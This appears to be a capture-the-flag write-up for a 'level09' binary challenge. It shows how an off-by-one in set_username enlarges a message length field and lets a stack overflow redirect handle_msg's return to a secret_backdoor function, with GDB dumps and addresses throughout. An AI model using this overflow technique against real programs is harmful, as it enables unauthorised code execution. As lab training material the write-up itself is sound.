# Tools
[Dogbolt - Decompiler Explorator](https://dogbolt.org/)
[Cutter - Reverse Engineering Tool](https://cutter.re/)
[GNU DeBugger - GDB](https://fr.wikipedia.org/wiki/GNU_Debugger)

# Exploit 
Level09 requires you to deepen your understanding of reverse-engineering.

# Explanation
Upon decompiling the binary, we stumble accross unusual declarations:
```c
  char v1[140]; 
  __int64 v2;
  __int64 v3;
  __int64 v4;
  __int64 v5;
  __int64 v6;
  int v7;

  v2 = 0LL;
  v3 = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 140;
```
With some investigation and a couple of hints (`strncpy` starting at certain indexes, functions writing at certain length stored at specific offsets from the start of the structure...) we guess that the lineup of declaration and assignation represents a structure:
```c
typedef struct s_message {
	char 	message[140];
	char	username[40];
	int		msg_len;
}			t_message;
```

However, we note a few key points:
- The copy of the passed username by `set_username()` writes 41 characters, when the buffer can only hold 40 characters (`for (i = 0; i <= 40 && s[i]; ++i)` when the buffer is 40 bytes long, and the loop writes characters from 0 to 40 included, so it's 41 characters)
- The copy of the message can be altered if we manage to increase the `msg_len` attribute from the `mess` structure.
- There is a `secret_backdoor()` function that we would like to access.

Let's see what we can do with GDB (the binary is a 64-bits binary so the names of the registers are different):
```
(gdb) b handle_msg
Breakpoint 1 at 0x8c4
(gdb) b set_username
Breakpoint 2 at 0x9d1
(gdb) b set_msg
Breakpoint 3 at 0x936
(gdb) r
Starting program: /home/users/level09/level09
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------

Breakpoint 1, 0x00005555555548c4 in handle_msg ()
(gdb) c
Continuing.

Breakpoint 2, 0x00005555555549d1 in set_username ()
(gdb) c
Continuing.
>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAA
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 3, 0x0000555555554936 in set_msg ()
(gdb) x/120x $sp
0x7fffffffec50:	0xffffed20	0x00007fff	0x55554924	0x00005555
0x7fffffffec60:	0x0000000a	0x00000000	0x55554c69	0x00005555
0x7fffffffec70:	0xf7ff7000	0x00007fff	0xf7a94713	0x00007fff
0x7fffffffec80:	0xf7dd4260	0x00007fff	0xf7dd4260	0x00007fff
0x7fffffffec90:	0x0000000a	0x00000000	0xf7ff7000	0x00007fff
0x7fffffffeca0:	0x0000002d	0x00000000	0xf7a945da	0x00007fff
0x7fffffffecb0:	0x00000086	0x00000000	0x0000002d	0x00000000
0x7fffffffecc0:	0x0000000a	0x00000000	0x55554c10	0x00005555
0x7fffffffecd0:	0xffffee10	0x00007fff	0xf7a95d45	0x00007fff
0x7fffffffece0:	0xf7dd4260	0x00007fff	0xf7a9608f	0x41414141
0x7fffffffecf0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffed00:	0x41414141	0x0000000a	0x00000000	0x00000000
0x7fffffffed10:	0x00000000	0x0000008c	0xffffed30	0x00007fff
```
We see that the length for the message is stored at `0x7fffffffed18` (`0x0000008c` = 140)

So, what we want to do is write 40 "A" and then the character "0xff", so that the message string will be able to potentially overwrite the return address.

We pass 40 "A" + "0xff" as username:
```
0x7fffffffecf0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffed00:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffed10:	0x41414141	0x000000ff	0xffffed30	0x00007fff
```
The message len is now `0xff` = 255 characters long, if we write many 'B' we get:
```
0x7fffffffec60:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffec70:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffec80:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffec90:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffeca0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffecb0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffecc0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffecd0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffece0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffecf0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffed00:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffed10:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffed20:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffed30:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffed40:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffed50:	0x42424242	0x42424242	0x42424242	0x00424242
0x7fffffffed60:	0x00000000	0x00000000	0xc283bfc9	0x554bdbb5
...
(gdb) c
Continuing.
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
```
...and segfault.

Just find where the return address sits at, calculate the offset starting from the beginning of the address of the message in the message struct, get the address of the `secret_backdoor` function using `info functions` in GDB, pack it all in a script and you are good to go.

Start of the message buffer: `0x7fffffffec60`

To find the return address, ask GDB to print the content at each address in 64-bit format:
```
(gdb) x/120gx $sp
0x7fffffffe4d0:	0x000000000000000a	0x0000555555554c69
0x7fffffffe4e0:	0x00007ffff7ff7000	0x00007ffff7a94713
0x7fffffffe4f0:	0x00007ffff7dd4260	0x00007ffff7dd4260
0x7fffffffe500:	0x000000000000000a	0x00007ffff7ff7000
0x7fffffffe510:	0x000000000000002d	0x00007ffff7a945da
0x7fffffffe520:	0x0000000000000086	0x000000000000002d
0x7fffffffe530:	0x000000000000000a	0x0000555555554c10
0x7fffffffe540:	0x00007fffffffe680	0x00007ffff7a95d45
0x7fffffffe550:	0x00007ffff7dd4260	0xfffffffff7a9608f
0x7fffffffe560:	0xffffffffffffffff	0xffffffffffffffff
0x7fffffffe570:	0xffffffffffffffff	0xffffffffffffffff
0x7fffffffe580:	0x000000ffffffffff	0x00007fffffffe5a0
0x7fffffffe590:	0x00007fffffffe5a0	0x0000555555554abd
```
Where `0x0000555555554abd` is the return address of the `handle_msg` function.
```
(gdb) disass main
Dump of assembler code for function main:
   0x0000555555554aa8 <+0>:	push   %rbp
   0x0000555555554aa9 <+1>:	mov    %rsp,%rbp
   0x0000555555554aac <+4>:	lea    0x15d(%rip),%rdi        # 0x555555554c10
   0x0000555555554ab3 <+11>:	callq  0x555555554730 <puts@plt>
   0x0000555555554ab8 <+16>:	callq  0x5555555548c0 <handle_msg>
   0x0000555555554abd <+21>:	mov    $0x0,%eax
   0x0000555555554ac2 <+26>:	pop    %rbp
   0x0000555555554ac3 <+27>:	retq
End of assembler dump.
```
So, we want to overflow address `0x7fffffffe598` and fill its content with the address of `secret_backdoor`: `0x000055555555488c` (see `info functions`)

After we filled out the message buffer, we can see that the return address has been overwritten:
```
(gdb) x/120gx $sp
0x7fffffffe4d0:	0x42424242424242ff	0x4242424242424242
0x7fffffffe4e0:	0x4242424242424242	0x4242424242424242
0x7fffffffe4f0:	0x4242424242424242	0x4242424242424242
0x7fffffffe500:	0x4242424242424242	0x4242424242424242
0x7fffffffe510:	0x4242424242424242	0x4242424242424242
0x7fffffffe520:	0x4242424242424242	0x4242424242424242
0x7fffffffe530:	0x4242424242424242	0x4242424242424242
0x7fffffffe540:	0x4242424242424242	0x4242424242424242
0x7fffffffe550:	0x4242424242424242	0x4242424242424242
0x7fffffffe560:	0x4242424242424242	0x4242424242424242
0x7fffffffe570:	0x4242424242424242	0x4242424242424242
0x7fffffffe580:	0x4242424242424242	0x4242424242424242
0x7fffffffe590:	0x4242424242424242	0x000055555555488c
```
Now, we can just resume the execution and print the flag!

Easier done with the script in `Resources/script.py`:
```bash
./level09 < <(python script.py)
```

GG!

# Resources
